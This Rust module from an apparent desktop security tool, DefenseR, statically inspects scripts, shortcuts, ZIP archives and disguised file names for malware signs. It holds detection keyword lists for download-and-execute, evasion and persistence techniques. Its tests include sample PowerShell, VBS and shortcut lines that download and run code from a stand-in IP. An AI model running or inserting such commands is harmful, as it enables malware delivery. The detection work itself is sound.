//! What can be told about files the model does not cover: scripts, shortcuts, ZIP archives
//! and file names made to deceive. Nothing is run; the files are only read.

use std::collections::HashMap;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::sync::{LazyLock, Mutex};
use std::time::SystemTime;

use crate::downloads::Place;
use crate::incidents::Severity;
use crate::lang::{tr, trs};
use crate::lock;
use crate::scanner::Verdict;

/// Scripts Windows runs on a double click.
const SCRIPTS: [&str; 9] = ["ps1", "bat", "cmd", "vbs", "vbe", "js", "jse", "wsf", "hta"];
/// Extensions that run something when opened.
const RUNNABLE: [&str; 15] = ["exe", "scr", "com", "pif", "cpl", "msi", "lnk", "ps1", "bat", "cmd", "vbs", "vbe", "js", "jse", "hta"];
/// Extensions people expect to be harmless documents.
const HARMLESS: [&str; 16] = ["pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "rtf", "jpg", "jpeg", "png", "gif", "mp3", "mp4", "zip"];
/// Programs a shortcut can start to run commands instead of opening a document.
const INTERPRETERS: [&str; 9] = ["powershell", "pwsh", "cmd.exe", "mshta", "wscript", "cscript", "rundll32", "regsvr32", "certutil"];

/// A script is read up to this size.
const MAX_SCRIPT: u64 = 2 * 1024 * 1024;
const MAX_SHORTCUT: u64 = 1024 * 1024;
/// An archive larger than this is not opened.
const MAX_ARCHIVE: u64 = 512 * 1024 * 1024;
const MAX_ENTRIES: usize = 2000;
/// A program inside an archive is unpacked into memory up to this size...
const MAX_ENTRY: u64 = 64 * 1024 * 1024;
/// ...and all of them together up to this, which also stops archive bombs.
const MAX_UNPACKED: u64 = 256 * 1024 * 1024;
/// A run of this many base64 characters is an encoded payload, not a word.
const BASE64_RUN: usize = 400;

/// One thing worth an incident about a file.
#[derive(Clone)]
pub struct Report {
    pub rule: &'static str,
    pub severity: Severity,
    pub title: String,
    pub summary: String,
    /// What exactly was found, for the incident's details.
    pub signs: Vec<String>,
}

fn extension(path: &Path) -> String {
    path.extension().map(|e| e.to_string_lossy().to_lowercase()).unwrap_or_default()
}

fn name_of(path: &Path) -> String {
    path.file_name().map(|name| name.to_string_lossy().into_owned()).unwrap_or_default()
}

/// Whether the file is of a kind this module looks into.
pub fn interesting(path: &Path) -> bool {
    let extension = extension(path);
    SCRIPTS.contains(&extension.as_str()) || extension == "lnk" || extension == "zip" || deceptive_name(&name_of(path)).is_some()
}

/// A name that passes a program off as a document: `invoice.pdf.exe`, or a real extension
/// pushed out of sight with spaces.
fn deceptive_name(name: &str) -> Option<String> {
    let lower = name.to_lowercase();
    let mut parts = lower.rsplit('.');
    let (last, before) = (parts.next()?, parts.next()?);
    if !RUNNABLE.contains(&last) {
        return None;
    }
    if HARMLESS.contains(&before.trim()) && parts.next().is_some() {
        return Some(trs(
            format!("Имя выглядит как документ .{}, но на самом деле это .{last} — файл, который запускается", before.trim()),
            format!("The name looks like a .{} document, but it is really .{last}, a file that runs", before.trim()),
        ));
    }
    if lower.contains("          ") {
        return Some(trs(
            format!("Настоящее расширение .{last} отодвинуто пробелами, чтобы его не было видно"),
            format!("The real extension .{last} is pushed out of sight with spaces"),
        ));
    }
    None
}

fn name_report(path: &Path) -> Option<Report> {
    let name = name_of(path);
    let sign = deceptive_name(&name)?;
    Some(Report {
        rule: "content-deceptive-name",
        severity: Severity::Medium,
        title: trs(format!("Файл {name} выдаёт себя за документ"), format!("File {name} poses as a document")),
        summary: tr(
            "Имя файла подобрано так, чтобы он выглядел безобидным документом, хотя при открытии он запустится как программа или скрипт. Обычным программам так называться незачем; это приём, рассчитанный на то, что расширение не заметят.",
            "The file is named to look like a harmless document, although opening it runs it as a program or a script. Ordinary software has no reason to be named like this; the trick counts on the extension going unnoticed.",
        )
        .to_string(),
        signs: vec![sign],
    })
}

/// Text of a script, whatever encoding it was saved in.
fn decode(bytes: &[u8]) -> String {
    let utf16 = bytes.starts_with(&[0xFF, 0xFE]) || bytes.iter().skip(1).step_by(2).take(200).filter(|byte| **byte == 0).count() > 50;
    if utf16 {
        let units: Vec<u16> = bytes.chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).collect();
        String::from_utf16_lossy(&units)
    } else {
        String::from_utf8_lossy(bytes).into_owned()
    }
}

fn has_base64_run(text: &str) -> bool {
    let mut run = 0;
    for byte in text.bytes() {
        if byte.is_ascii_alphanumeric() || byte == b'+' || byte == b'/' || byte == b'=' {
            run += 1;
            if run >= BASE64_RUN {
                return true;
            }
        } else {
            run = 0;
        }
    }
    false
}

/// The things a script does that matter here, as short phrases. `text` is lowercased.
fn script_signs(text: &str) -> (Vec<String>, bool) {
    let any = |patterns: &[&str]| patterns.iter().any(|pattern| text.contains(pattern));
    let count = |pattern: &str| text.matches(pattern).count();

    let download = any(&[
        "downloadstring", "downloadfile", "downloaddata", "invoke-webrequest", "invoke-restmethod", "iwr ", "irm ", "start-bitstransfer", "bitsadmin",
        "urlcache", "msxml2.xmlhttp", "winhttp.winhttprequest", "net.webclient", "curl http", "curl.exe", "wget http",
    ]);
    let execute = any(&[
        "invoke-expression", "iex ", "iex(", "|iex", "| iex", "wscript.shell", "shell.application", "mshta", "regsvr32", "rundll32", "eval(", "execute(",
        "[reflection.assembly]::load", "start-process",
    ]);
    let hidden = any(&["-w hidden", "-win hidden", "-windowstyle hidden", "-window hidden", "createnowindow", "vbhide"]);
    let encoded = any(&["-enc ", "-encodedcommand", "frombase64string", "-bxor"]) || has_base64_run(text) || count("[char]") >= 15 || count("chr(") >= 15 || count("fromcharcode") >= 5;
    let persistence = any(&["currentversion\\run", "schtasks", "register-scheduledtask", "new-scheduledtask", "\\startup\\", "new-service", "sc create"]);
    let evasion = any(&[
        "set-mppreference", "add-mppreference", "disablerealtimemonitoring", "amsiutils", "amsiinitfailed", "executionpolicy bypass", "-ep bypass",
        "netsh advfirewall set", "vssadmin delete", "bcdedit",
    ]);

    let found = [
        (download, tr("скачивает что-то из интернета", "downloads something from the internet")),
        (execute, tr("запускает другие программы или код, собранный на ходу", "runs other programs or code put together on the fly")),
        (hidden, tr("прячет своё окно", "hides its window")),
        (encoded, tr("скрывает свой текст кодированием", "hides its own text by encoding it")),
        (persistence, tr("прописывает что-то в автозапуск", "sets something up to start automatically")),
        (evasion, tr("отключает или обходит защиту Windows", "turns off or gets around Windows protection")),
    ];
    let signs: Vec<String> = found.iter().filter(|(present, _)| *present).map(|(_, text)| text.to_string()).collect();
    let severe = signs.len() >= 4 || (download && execute && (hidden || encoded || evasion));
    (signs, severe)
}

/// A script deserves an incident when it combines at least two of the things above.
fn script_report(name: &str, bytes: &[u8], extension: &str) -> Option<Report> {
    let text = decode(bytes).to_lowercase();
    // A .js file is only a Windows script if it uses the Windows script host; otherwise it is
    // web code that a browser or Node runs, and none of this applies.
    if matches!(extension, "js" | "jse") && !text.contains("activexobject") && !text.contains("wscript.") {
        return None;
    }
    let (signs, severe) = script_signs(&text);
    if signs.len() < 2 {
        return None;
    }
    Some(Report {
        rule: "content-script",
        severity: if severe { Severity::High } else { Severity::Medium },
        title: trs(format!("Скрипт {name} делает то, что обычно делают вредоносные"), format!("Script {name} does what malicious scripts usually do")),
        summary: tr(
            "DefenseR прочитал этот скрипт, не запуская его, и нашёл сочетание действий, типичное для загрузчиков вредоносных программ. Так же устроены и некоторые установочные скрипты, которые вы скачали сами: если вы знаете, откуда этот файл и зачем он, нажмите «Доверять файлу». Иначе не запускайте его.",
            "DefenseR read this script without running it and found a combination of actions typical of malware downloaders. Some install scripts you downloaded on purpose are built the same way: if you know where this file comes from and what it is for, click “Trust file”. Otherwise do not run it.",
        )
        .to_string(),
        signs,
    })
}

/// The file a shortcut opens, read from the shortcut's own record of it. `None` for shortcuts
/// that do not name a local file: ones to Store apps, to network places, or damaged ones.
pub fn shortcut_target(bytes: &[u8]) -> Option<String> {
    let u16_at = |at: usize| Some(u16::from_le_bytes(bytes.get(at..at + 2)?.try_into().ok()?) as usize);
    let u32_at = |at: usize| Some(u32::from_le_bytes(bytes.get(at..at + 4)?.try_into().ok()?) as usize);
    // The header is always 0x4C bytes long and says which parts follow.
    if u32_at(0)? != 0x4C {
        return None;
    }
    let flags = u32_at(0x14)?;
    let mut at = 0x4C;
    if flags & 1 != 0 {
        at += 2 + u16_at(at)?;
    }
    if flags & 2 == 0 {
        return None;
    }
    let info = bytes.get(at..at + u32_at(at)?)?;
    let field = |offset: usize| Some(u32::from_le_bytes(info.get(offset..offset + 4)?.try_into().ok()?) as usize);
    let header = field(4)?;
    // Bit 0: the target is on a local drive and its path is stored here.
    if field(8)? & 1 == 0 {
        return None;
    }
    let narrow = |offset: usize| {
        let text = info.get(offset..)?;
        Some(String::from_utf8_lossy(&text[..text.iter().position(|byte| *byte == 0)?]).into_owned())
    };
    let wide = |offset: usize| {
        let units: Vec<u16> = info.get(offset..)?.chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).take_while(|unit| *unit != 0).collect();
        Some(String::from_utf16_lossy(&units))
    };
    // Newer shortcuts also keep the path as UTF-16, which is the one that survives non-Latin names.
    let (base, suffix) = if header >= 0x24 && field(28)? != 0 {
        (wide(field(28)?)?, field(32).filter(|offset| *offset != 0).and_then(wide).unwrap_or_default())
    } else {
        (narrow(field(16)?)?, field(24).filter(|offset| *offset != 0).and_then(narrow).unwrap_or_default())
    };
    let path = format!("{base}{suffix}");
    (!path.is_empty()).then_some(path)
}

/// The arguments a shortcut passes to the program it opens. `None` when it passes none or
/// the file is not a shortcut.
pub fn shortcut_arguments(bytes: &[u8]) -> Option<String> {
    let u16_at = |at: usize| Some(u16::from_le_bytes(bytes.get(at..at + 2)?.try_into().ok()?) as usize);
    let u32_at = |at: usize| Some(u32::from_le_bytes(bytes.get(at..at + 4)?.try_into().ok()?) as usize);
    if u32_at(0)? != 0x4C {
        return None;
    }
    let flags = u32_at(0x14)?;
    let mut at = 0x4C;
    // The list of shell items and the record of the target come first, when present.
    if flags & 1 != 0 {
        at += 2 + u16_at(at)?;
    }
    if flags & 2 != 0 {
        at += u32_at(at)?;
    }
    let wide = flags & 0x80 != 0;
    // Then the strings, in this order: name, relative path, working folder, arguments.
    for bit in [0x04, 0x08, 0x10, 0x20] {
        if flags & bit == 0 {
            continue;
        }
        let size = u16_at(at)? * if wide { 2 } else { 1 };
        let data = bytes.get(at + 2..at + 2 + size)?;
        if bit == 0x20 {
            return Some(if wide {
                String::from_utf16_lossy(&data.chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).collect::<Vec<u16>>())
            } else {
                String::from_utf8_lossy(data).into_owned()
            });
        }
        at += 2 + size;
    }
    None
}

/// Everything readable in a shortcut, lowercased: its strings are stored both as UTF-16 and as bytes.
fn shortcut_text(bytes: &[u8]) -> String {
    let wide: Vec<u16> = bytes.chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).collect();
    let mut text = String::from_utf16_lossy(&wide);
    if bytes.len() > 1 {
        let shifted: Vec<u16> = bytes[1..].chunks_exact(2).map(|pair| u16::from_le_bytes([pair[0], pair[1]])).collect();
        text.push_str(&String::from_utf16_lossy(&shifted));
    }
    text.push_str(&String::from_utf8_lossy(bytes));
    text.to_lowercase()
}

/// A shortcut that starts a command interpreter rather than opening a program or a document.
fn shortcut_report(name: &str, bytes: &[u8], place: Place) -> Option<Report> {
    let text = shortcut_text(bytes);
    let interpreter = INTERPRETERS.iter().find(|interpreter| text.contains(**interpreter))?;
    let loaded = ["http://", "https://", "-enc", "hidden", "frombase64", "iex", "downloadstring", "javascript:", "vbscript:"].iter().any(|sign| text.contains(sign));
    // A shortcut to the command line that arrives from outside is suspicious on its own;
    // one on the desktop is usually the user's own.
    let arrived = matches!(place, Place::Downloads | Place::Removable | Place::Temp);
    if !loaded && !arrived {
        return None;
    }
    let mut signs = vec![trs(format!("Запускает {interpreter}, а не открывает документ или программу"), format!("Starts {interpreter} instead of opening a document or a program"))];
    if loaded {
        signs.push(tr("В команде есть адрес в интернете, скрытое окно или закодированный текст", "The command has an internet address, a hidden window or encoded text").to_string());
    }
    Some(Report {
        rule: "content-shortcut",
        severity: if loaded { Severity::High } else { Severity::Medium },
        title: trs(format!("Ярлык {name} запускает командную строку"), format!("Shortcut {name} starts a command line")),
        summary: tr(
            "Ярлык выглядит как обычный файл, но при открытии выполняет команду. Так распространяются вредоносные программы на флешках и в скачанных архивах: вместо папки или документа лежит ярлык с их значком. Не открывайте его, если не создавали сами.",
            "A shortcut looks like an ordinary file, but opening it runs a command. This is how malware spreads on USB sticks and in downloaded archives: in place of a folder or a document there is a shortcut with its icon. Do not open it unless you made it yourself.",
        )
        .to_string(),
        signs,
    })
}

/// Looks inside a ZIP archive: at the names of everything in it, and into the programs and
/// scripts that are not protected by a password. `score` rates a program's bytes with the model.
fn archive_report(path: &Path, score: &dyn Fn(&[u8]) -> Option<Verdict>) -> Option<Report> {
    let name = name_of(path);
    let mut archive = zip::ZipArchive::new(std::fs::File::open(path).ok()?).ok()?;
    let mut signs = Vec::new();
    let mut severity = Severity::Low;
    let mut locked = Vec::new();
    let mut unpacked = 0u64;

    for index in 0..archive.len().min(MAX_ENTRIES) {
        // The raw entry gives the name, size and password flag without unpacking anything.
        let (inner, size, encrypted) = {
            let Ok(entry) = archive.by_index_raw(index) else { continue };
            if entry.is_dir() {
                continue;
            }
            let Ok(inner) = entry.name().map(|name| name.into_owned()) else { continue };
            (inner, entry.size(), entry.encrypted())
        };
        let inner_path = Path::new(&inner);
        let inner_name = name_of(inner_path);
        let inner_extension = extension(inner_path);
        let runnable = RUNNABLE.contains(&inner_extension.as_str()) || inner_extension == "dll";

        if let Some(sign) = deceptive_name(&inner_name) {
            signs.push(format!("{inner_name}: {sign}"));
            severity = severity.max(Severity::Medium);
        }
        if !runnable {
            continue;
        }
        if encrypted {
            locked.push(inner_name);
            continue;
        }
        let limit = if SCRIPTS.contains(&inner_extension.as_str()) || inner_extension == "lnk" { MAX_SCRIPT } else { MAX_ENTRY };
        if size > limit || unpacked + size > MAX_UNPACKED {
            continue;
        }
        let mut bytes = Vec::new();
        let read = archive.by_index(index).ok().and_then(|entry| entry.take(limit).read_to_end(&mut bytes).ok());
        if read.is_none() {
            continue;
        }
        unpacked += bytes.len() as u64;

        if SCRIPTS.contains(&inner_extension.as_str()) {
            if let Some(report) = script_report(&inner_name, &bytes, &inner_extension) {
                signs.push(trs(format!("Скрипт {inner_name}: {}", report.signs.join(", ")), format!("Script {inner_name}: {}", report.signs.join(", "))));
                severity = severity.max(report.severity);
            }
        } else if inner_extension == "lnk" {
            if let Some(report) = shortcut_report(&inner_name, &bytes, Place::Downloads) {
                signs.push(trs(format!("Ярлык {inner_name} запускает командную строку"), format!("Shortcut {inner_name} starts a command line")));
                severity = severity.max(report.severity);
            }
        } else if score(&bytes) == Some(Verdict::Malicious) {
            // Only the model's confident verdict: a signature cannot be checked without unpacking to disk.
            signs.push(trs(
                format!("Программа {inner_name}: локальная модель считает её похожей на вредоносную"),
                format!("Program {inner_name}: the local model considers it similar to malware"),
            ));
            severity = severity.max(Severity::Medium);
        }
    }

    if !locked.is_empty() {
        let shown = locked.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
        signs.push(trs(
            format!("Архив закрыт паролем, а внутри лежит то, что запускается: {shown}. Заглянуть внутрь DefenseR не может, как и антивирус"),
            format!("The archive is password-protected and holds something that runs: {shown}. DefenseR cannot look inside, and neither can an antivirus"),
        ));
        severity = severity.max(Severity::Medium);
    }
    if signs.is_empty() {
        return None;
    }
    signs.truncate(6);
    Some(Report {
        rule: "content-archive",
        severity,
        title: trs(format!("В архиве {name} есть подозрительное содержимое"), format!("Archive {name} has suspicious contents")),
        summary: tr(
            "DefenseR заглянул в архив, не распаковывая его на диск. Архив с паролем, в котором лежит программа, — обычный способ пронести вредоносный файл мимо антивируса: пароль при этом присылают рядом, в письме или на странице загрузки. Если вы не ждали этот архив, не распаковывайте и не запускайте его содержимое.",
            "DefenseR looked into the archive without unpacking it to disk. A password-protected archive with a program inside is a common way to carry a malicious file past an antivirus: the password comes alongside, in the email or on the download page. If you were not expecting this archive, do not unpack it or run what is inside.",
        )
        .to_string(),
        signs,
    })
}

struct Cached {
    size: u64,
    modified: Option<SystemTime>,
    place: Place,
    reports: Vec<Report>,
}

/// Reports by file, so that a flagged archive is not unpacked again on every pass.
static CACHE: LazyLock<Mutex<HashMap<PathBuf, Cached>>> = LazyLock::new(|| Mutex::new(HashMap::new()));

/// Everything worth an incident about the file at `path`, found in `place`.
pub fn inspect(path: &Path, place: Place, score: &dyn Fn(&[u8]) -> Option<Verdict>) -> Vec<Report> {
    let Ok(metadata) = std::fs::metadata(path) else { return Vec::new() };
    let (size, modified) = (metadata.len(), metadata.modified().ok());
    if let Some(known) = lock(&CACHE).get(path) {
        if known.size == size && known.modified == modified && known.place == place {
            return known.reports.clone();
        }
    }

    let name = name_of(path);
    let extension = extension(path);
    let mut reports: Vec<Report> = name_report(path).into_iter().collect();
    let read = |limit: u64| (size <= limit).then(|| std::fs::read(path).ok()).flatten();
    if SCRIPTS.contains(&extension.as_str()) {
        reports.extend(read(MAX_SCRIPT).and_then(|bytes| script_report(&name, &bytes, &extension)));
    } else if extension == "lnk" {
        reports.extend(read(MAX_SHORTCUT).and_then(|bytes| shortcut_report(&name, &bytes, place)));
    } else if extension == "zip" && size <= MAX_ARCHIVE {
        reports.extend(archive_report(path, score));
    }

    let mut cache = lock(&CACHE);
    if cache.len() > 5000 {
        cache.clear();
    }
    cache.insert(path.to_path_buf(), Cached { size, modified, place, reports: reports.clone() });
    reports
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn shortcut_arguments_are_read() {
        let text = |value: &str| {
            let units: Vec<u16> = value.encode_utf16().collect();
            let mut bytes = (units.len() as u16).to_le_bytes().to_vec();
            bytes.extend(units.iter().flat_map(|unit| unit.to_le_bytes()));
            bytes
        };
        // A header that announces a name, arguments and UTF-16 strings, and nothing before them.
        let mut lnk = vec![0u8; 0x4C];
        lnk[0] = 0x4C;
        lnk[0x14..0x18].copy_from_slice(&(0x04u32 | 0x20 | 0x80).to_le_bytes());
        lnk.extend(text("Браузер"));
        lnk.extend(text("--proxy-server=10.0.0.5:8080 https://start.example.net"));
        assert_eq!(shortcut_arguments(&lnk).as_deref(), Some("--proxy-server=10.0.0.5:8080 https://start.example.net"));

        // The same without arguments.
        let mut plain = vec![0u8; 0x4C];
        plain[0] = 0x4C;
        plain[0x14..0x18].copy_from_slice(&(0x04u32 | 0x80).to_le_bytes());
        plain.extend(text("Браузер"));
        assert_eq!(shortcut_arguments(&plain), None);
        assert_eq!(shortcut_arguments(b"not a shortcut"), None);
    }

    #[test]
    fn shortcut_target_is_read() {
        // A header, an item list of 4 bytes, and a link info block with a local base path.
        let path = b"C:\\Program Files\\App\\app.exe\0";
        let mut bytes = vec![0u8; 0x4C];
        bytes[..4].copy_from_slice(&0x4Cu32.to_le_bytes());
        bytes[0x14..0x18].copy_from_slice(&3u32.to_le_bytes());
        bytes.extend([2, 0, 0, 0]);
        let mut info = Vec::new();
        for value in [0x1C + path.len() as u32 + 1, 0x1C, 1, 0, 0x1C, 0, 0x1C + path.len() as u32] {
            info.extend(value.to_le_bytes());
        }
        info.extend(path);
        info.push(0);
        bytes.extend(info);
        assert_eq!(shortcut_target(&bytes).as_deref(), Some("C:\\Program Files\\App\\app.exe"));

        bytes[0x14] = 1;
        assert_eq!(shortcut_target(&bytes), None, "a shortcut without a local path");
        assert_eq!(shortcut_target(b"not a shortcut"), None);
    }

    #[test]
    fn deceptive_names_are_recognised() {
        assert!(deceptive_name("Счёт.pdf.exe").is_some());
        assert!(deceptive_name("photo.jpg.scr").is_some());
        assert!(deceptive_name("report.docx                    .exe").is_some());
        assert!(deceptive_name("setup.exe").is_none());
        assert!(deceptive_name("archive.tar.gz").is_none());
        assert!(deceptive_name("my.pdf.reader.exe").is_none(), "a dot in a program's name is not a disguise");
        assert!(deceptive_name("pdf.exe").is_none());
    }

    #[test]
    fn a_downloader_script_is_reported_and_an_ordinary_one_is_not() {
        let downloader = b"powershell -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')\"";
        let report = script_report("run.bat", downloader, "bat").expect("download, run and hide");
        assert!(report.severity == Severity::High && report.signs.len() == 3);

        let installer = b"$x = Invoke-WebRequest https://example.com/tool.zip -OutFile tool.zip\nExpand-Archive tool.zip";
        assert!(script_report("get.ps1", installer, "ps1").is_none(), "one action alone is not enough");

        let backup = b"@echo off\r\nrobocopy C:\\Work D:\\Backup /MIR\r\necho done";
        assert!(script_report("backup.bat", backup, "bat").is_none());

        let web = b"fetch('/api').then(r => eval('(' + r + ')')); new XMLHttpRequest();";
        assert!(script_report("app.js", web, "js").is_none(), "browser code is not a Windows script");
    }

    #[test]
    fn utf16_scripts_are_read_too() {
        let text = "Set s = CreateObject(\"WScript.Shell\")\r\ns.Run \"bitsadmin /transfer x http://203.0.113.5/a %TEMP%\\a.exe\", 0";
        let mut bytes = vec![0xFF, 0xFE];
        bytes.extend(text.encode_utf16().flat_map(u16::to_le_bytes));
        assert!(script_report("open.vbs", &bytes, "vbs").is_some());
    }

    #[test]
    fn shortcut_to_an_interpreter_is_reported_by_where_it_came_from() {
        let mut bytes = vec![0x4C, 0, 0, 0];
        bytes.extend(r"C:\Windows\System32\cmd.exe".encode_utf16().flat_map(u16::to_le_bytes));
        assert!(shortcut_report("Docs.lnk", &bytes, Place::Removable).is_some_and(|report| report.severity == Severity::Medium));
        assert!(shortcut_report("cmd.lnk", &bytes, Place::Desktop).is_none(), "the user's own shortcut");

        bytes.extend(" /c powershell -w hidden iwr https://203.0.113.5/a".encode_utf16().flat_map(u16::to_le_bytes));
        assert!(shortcut_report("cmd.lnk", &bytes, Place::Desktop).is_some_and(|report| report.severity == Severity::High));

        let mut plain = vec![0x4C, 0, 0, 0];
        plain.extend(r"C:\Program Files\App\app.exe".encode_utf16().flat_map(u16::to_le_bytes));
        assert!(shortcut_report("App.lnk", &plain, Place::Downloads).is_none());
    }

    #[test]
    fn archive_contents_are_looked_into() {
        let dir = std::env::temp_dir().join(format!("defenser-content-test-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let options = zip::write::SimpleFileOptions::default();

        let bad = dir.join("bad.zip");
        let mut writer = zip::ZipWriter::new(std::fs::File::create(&bad).unwrap());
        writer.start_file("docs/readme.txt", options).unwrap();
        writer.write_all(b"hello").unwrap();
        writer.start_file("docs/invoice.pdf.exe", options).unwrap();
        writer.write_all(b"MZ not really a program").unwrap();
        writer.start_file("tool.exe", options).unwrap();
        writer.write_all(b"MZ flagged").unwrap();
        writer.finish().unwrap();

        let flagged = |bytes: &[u8]| bytes.ends_with(b"flagged").then_some(Verdict::Malicious);
        let report = archive_report(&bad, &flagged).expect("a disguised name and a flagged program");
        assert_eq!(report.signs.len(), 2);
        assert!(report.severity == Severity::Medium);

        let fine = dir.join("fine.zip");
        let mut writer = zip::ZipWriter::new(std::fs::File::create(&fine).unwrap());
        writer.start_file("setup.exe", options).unwrap();
        writer.write_all(b"MZ ordinary").unwrap();
        writer.finish().unwrap();
        assert!(archive_report(&fine, &flagged).is_none());
        assert!(inspect(&fine, Place::Downloads, &flagged).is_empty());

        let _ = std::fs::remove_dir_all(&dir);
    }
}
